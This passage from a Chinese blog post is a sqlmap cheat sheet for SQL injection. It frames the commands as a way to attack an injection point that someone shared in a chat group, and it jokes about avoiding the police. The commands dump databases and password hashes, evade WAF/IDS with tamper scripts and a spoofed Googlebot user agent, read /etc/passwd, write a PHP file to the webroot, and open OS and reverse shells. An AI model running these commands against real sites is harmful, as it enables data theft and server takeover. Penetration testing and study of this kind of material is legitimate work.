网址 --is-dba -v 1</span><br><span class="line"></span><br><span class="line">2)--users:列出数据库管理系统用户</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --users -v 0</span><br><span class="line"></span><br><span class="line">3)--passwords:数据库用户密码(hash)</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --passwords -v 0</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --passwords -U sa -v 0</span><br><span class="line"></span><br><span class="line">4)查看用户权限</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --privileges -v 0</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --privileges -U postgres -v 0</span><br><span class="line"></span><br><span class="line">5)--dbs可以利用的数据库</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --dbs -v 0</span><br><span class="line"></span><br><span class="line">6)--tables列数据库表</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --tables -D &quot;information_scheam&quot;</span><br><span class="line"></span><br><span class="line">-D:指定数据名称</span><br><span class="line"></span><br><span class="line">7)--columns 列出表中的列名</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --columns -T &quot;user&quot; -D &quot;mysql&quot; -v 1</span><br><span class="line"></span><br><span class="line">-T:指定表名，-D:指定库名</span><br><span class="line"></span><br><span class="line">8)--dump列表中指定列的内容</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --dump -T &quot;users&quot; -D &quot;testdb&quot;</span><br><span class="line"></span><br><span class="line">-C:可以指定字段</span><br><span class="line"></span><br><span class="line">指定列的范围为2到4</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --dump -T &quot;users&quot; -D &quot;testdb&quot; --start 2 --stop 4 -v 0</span><br><span class="line"></span><br><span class="line">9)--dumap-all列出所有数据库，所有表内容</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 网址 --dump-all -v 0</span><br></pre></td></tr></table></figure>

<p>sqlmap注入技巧-绕过WAF和IDS</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><span class="line">刚刚群里有个哥们发了个注入点，有IDS防火墙，请求过于频繁就会封杀IP</span><br><span class="line"></span><br><span class="line">有个思路，抛砖引玉，各位大牛请轻拍</span><br><span class="line"></span><br><span class="line">sqlmap.py --proxy http:&#x2F;&#x2F;127.0.0.1:8087 -u 你懂得 -v 3 –dbms “MySQL” --tamper “space2morehash.py” --referer“http:&#x2F;&#x2F;www.google.com” --user-agent &quot;Googlebot&#x2F;2.1 (+http:&#x2F;&#x2F;www.googlebot.com&#x2F;bot.html）&quot;</span><br><span class="line"></span><br><span class="line">参数解释 ：</span><br><span class="line"></span><br><span class="line">--proxy &#x2F;&#x2F;这个是代理的IP，你不用代理不用VPN就不怕被查水表么。。。</span><br><span class="line"></span><br><span class="line">-u &#x2F;&#x2F;这个不懂的面壁去</span><br><span class="line"></span><br><span class="line">-v 3 &#x2F;&#x2F;这个是注入的详细级别1-5</span><br><span class="line"></span><br><span class="line">--dbms &quot;MySQL&quot; &#x2F;&#x2F;指定数据库</span><br><span class="line"></span><br><span class="line">--tamper “space2morehash.py” &#x2F;&#x2F;载入绕过WAF防火墙的脚本</span><br><span class="line"></span><br><span class="line">--referer“http:&#x2F;&#x2F;www.google.com” &#x2F;&#x2F;模拟来源，就是从哪个网页跳转过来的。如果不懂可以谷歌referer</span><br><span class="line"></span><br><span class="line">--user-agent &quot;Googlebot&#x2F;2.1 (+http:&#x2F;&#x2F;www.googlebot.com&#x2F;bot.html）&quot; 模拟谷歌蜘蛛，一般都不会限制蜘蛛爬网站。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">更多命令运用：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;wenku.baidu.com&#x2F;link?url&#x3D;eMzrblqUDfXDaosGNkAKnthsT4AA79BEgd5XUnD624yqefBbHaqZk-lVx3pns2M6tApuP7bbNYpPTHGBgiCxdutlUKFGtdmJj80usI2nBuS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap注入方式普及</span><br><span class="line"></span><br><span class="line">0.详细参数详解：http:&#x2F;&#x2F;pan.baidu.com&#x2F;share&#x2F;link?shareid&#x3D;503193&amp;uk&#x3D;3223979763</span><br><span class="line"></span><br><span class="line">1. 基础用法：</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “注入地址” -v 1 --dbs &#x2F;&#x2F; 列举数据库</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “注入地址” -v 1 --current-db &#x2F;&#x2F; 当前数据库</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “注入地址” -v 1 --users &#x2F;&#x2F; 列数据库用户</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “注入地址” -v 1 --current-user &#x2F;&#x2F; 当前用户</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “注入地址” -v 1 --tables -D “数据库” &#x2F;&#x2F; 列举数据库的表名</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “注入地址” -v 1 --columns -T “表名” -D “数据库” &#x2F;&#x2F; 获取表的列名</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “注入地址” -v 1 --dump -C “字段,字段” -T “表名” -D “数据库” &#x2F;&#x2F; 获取表中的数据，包含列</span><br><span class="line"></span><br><span class="line">已经开始拖库了，SQLMAP是非常人性化的，它会将获取的数据存储sqlmap&#x2F;output&#x2F;中、、、</span><br><span class="line"></span><br><span class="line">2. sqlmap post注入</span><br><span class="line"></span><br><span class="line">我们在使用Sqlmap进行post型注入时，</span><br><span class="line"></span><br><span class="line">经常会出现请求遗漏导致注入失败的情况。</span><br><span class="line"></span><br><span class="line">这里分享一个小技巧，即结合burpsuite来使用sqlmap，</span><br><span class="line"></span><br><span class="line">用这种方法进行post注入测试会更准确，操作起来也非常容易。</span><br><span class="line"></span><br><span class="line">1. 浏览器打开目标地址http:&#x2F;&#x2F; www.2cto.com &#x2F;Login.asp</span><br><span class="line"></span><br><span class="line">2. 配置burp代理(127.0.0.1:8080)以拦截请求</span><br><span class="line"></span><br><span class="line">3. 点击login表单的submit按钮</span><br><span class="line"></span><br><span class="line">4. 如下图，这时候Burp会拦截到了我们的登录POST请求</span><br><span class="line"></span><br><span class="line">5. 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</span><br><span class="line"></span><br><span class="line">6. 运行sqlmap并使用如下命令：</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -r search-test.txt -p tfUPass</span><br><span class="line"></span><br><span class="line">这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，</span><br><span class="line"></span><br><span class="line">而-p 大家应该比较熟悉，指定注入用的参数。</span><br><span class="line"></span><br><span class="line">3，sqlmap cookies注入</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;base.php&quot; --cookies &quot;id&#x3D;1&quot; --dbs --level 2</span><br><span class="line"></span><br><span class="line">2.默认情况下SQLMAP只支持GET&#x2F;POST参数的注入测试，但是当使用--level 参数且数值&gt;&#x3D;2的时候也会检查cookie时面的参数，当&gt;&#x3D;3的时候将检查User-agent和Referer，那么这就很简单了，我们直接在原有的基础上面加上 --level 2 即可</span><br><span class="line"></span><br><span class="line">利用sqlmap cookies注入突破用户登录继续注入</span><br><span class="line"></span><br><span class="line">先把用户登陆的cookie拿到吧，</span><br><span class="line"></span><br><span class="line">在收藏夹添加一个链接cookies属性：</span><br><span class="line"></span><br><span class="line">名字自己取</span><br><span class="line"></span><br><span class="line">javascript:alert(document.cookie)，，需要获取当前cookie的时候，</span><br><span class="line"></span><br><span class="line">直接点一下这个链接，然后复制一下弹出对话框</span><br><span class="line"></span><br><span class="line">里的cookie值就搞定了</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http:&#x2F;&#x2F;x.x.x.x&#x2F;Down.aspx?tid&#x3D;2 -p tid --dbms mssql --cookie&#x3D;&quot;info&#x3D;username&#x3D;test&quot;</span><br><span class="line"></span><br><span class="line">-p是指指定参数注入</span><br><span class="line"></span><br><span class="line">4. sqlmap遇到url重写的注入</span><br><span class="line"></span><br><span class="line">哪里存在注入就加上 * 号</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u &quot;http:&#x2F;&#x2F;www.cunlide.com&#x2F;id1&#x2F;1*&#x2F;id2&#x2F;2&quot;</span><br><span class="line"></span><br><span class="line">5.sqlmap 编码绕waf注入</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 -v 3 –dbms “MySQL” –technique U -p id –batch –tamper &quot;space2morehash.py&quot;</span><br><span class="line"></span><br><span class="line">在sqlmap 的 tamper目录下有很多space2morehash.py 编码脚本自行加载</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap读文件</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--file-read “&#x2F;etc&#x2F;passwd&quot;</span><br><span class="line"></span><br><span class="line">sqlmap写文件</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--file-write &#x2F;localhost&#x2F;mm.php --file-dest&#x2F;var&#x2F;www&#x2F;html&#x2F;xx.php -v 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap分段脱裤</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url -D &quot;data&quot; -T &quot;tables&quot; -C &quot;username,password,email&quot; --dump --threads&#x3D;5 --start&#x3D;1 --stop&#x3D;5000</span><br><span class="line"></span><br><span class="line">其他基础：</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart --dbms &quot;Mysql&quot; --current-user #获取当前用户名称</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;www.xxoo.com&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart --dbms &quot;Mysql&quot; --current-db #获取当前数据库名称</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;www.xxoo.com&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart --dbms &quot;Mysql&quot;--tables -D &quot;db_name&quot; #列表名</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart --dbms &quot;Mysql&quot; --columns -T &quot;tablename&quot; users-D &quot;db_name&quot; -v 0 #列字段</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart --dbms &quot;Mysql&quot; --dump -C &quot;column_name&quot; -T &quot;table_name&quot; -D &quot;db_name&quot; -v 0 #获取字段内容</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">******************信息获取******************</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --users #列数据库用户</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --dbs#列数据库</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--passwords #数据库用户密码</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--passwords-U root -v 0 #列出指定用户数据库密码</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --dump-all -v 0 #列出所有数据库所有表</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--privileges #查看权限</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--privileges -U root #查看指定用户权限</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --is-dba -v 1 #是否是数据库管理员</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --roles #枚举数据库用户角色</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--udf-inject #导入用户自定义函数（获取系统权限！）</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--dump-all --exclude-sysdbs -v 0 #列出当前库所有表</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --union-check #是否支持union 注入</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--union-cols #union 查询表记录</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --union-test #union 语句测试</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --union-use --banner #采用union 注入</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--union-test --union-tech orderby #union 配合 order by</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--method &quot;POST&quot; -- data &quot;id&#x3D;1&amp;cat&#x3D;2&quot; #post注入</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--cookie &quot;COOKIE_VALUE&quot; #cookie注入</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;-b #获取banner信息</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart-v 1 -f #指纹判别数据库类型</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart--proxy&quot;http:&#x2F;&#x2F;127.0.0.1:8118&quot; #代理注入</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot; #指定关键词</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--sql-shell #执行指定sql命令</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--os-cmd&#x3D;whoami #执行系统命令</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--os-shell #系统交互shell</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--os-pwn #反弹shell</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--reg-read #读取win系统注册表</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --dbs-o &quot;sqlmap.log&quot; #保存进度</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --dbs -o &quot;sqlmap.log&quot; --resume #恢复已保存进度</span><br><span class="line"></span><br><span class="line">.&#x2F;sqlmap.py -u “http:&#x2F;&#x2F;www.91ri.org&#x2F; id1&#x2F;1*&#x2F;id2&#x2F;2″</span><br><span class="line"></span><br><span class="line">&quot;Show.asp&quot; --cookie &quot;id&#x3D;9&quot; --table --level 2</span><br><span class="line"></span><br><span class="line">--forms</span><br><span class="line"></span><br><span class="line">--data &quot;data&quot;</span><br><span class="line"></span><br><span class="line">--delay 0.5</span><br><span class="line"></span><br><span class="line">--safe-freq 25</span><br><span class="line"></span><br><span class="line">-v 3 --dbs --batch --tamper &quot;base64encode.py&quot;</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url -D &quot;data&quot; -T &quot;tables&quot; -C &quot;username,password,email&quot; --dump-all -v 0</span><br></pre></td></tr></table></figure>
        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>future.zhangyan</span>
                    </p>
                
				
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://zhangyanlady.github.io/2020/03/09/sqlmap%E4%BD%BF%E7%94%A8/">https://zhangyanlady.github.io/2020/03/09/sqlmap%E4%BD%BF%E7%94%A8/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>The future can be expected, the world is worth it.</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"># 网络安全</a>
                    
                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2020/03/19/DDOS%E6%94%BB%E5%87%BB/">DDOS攻击</a>
            
            
            <a class="next" rel="next" href="/2020/02/24/%E7%A4%BE%E5%B7%A5%E3%80%81APT/">社工、APT</a>
            
        </section>
			</br>
			

</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© future.zhangyan | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
	<span id="busuanzi_container_site_pv">
    本站总访问量<span id="busuanzi_value_site_pv"></span>次
</span>
</footer>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

    </div>


	
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
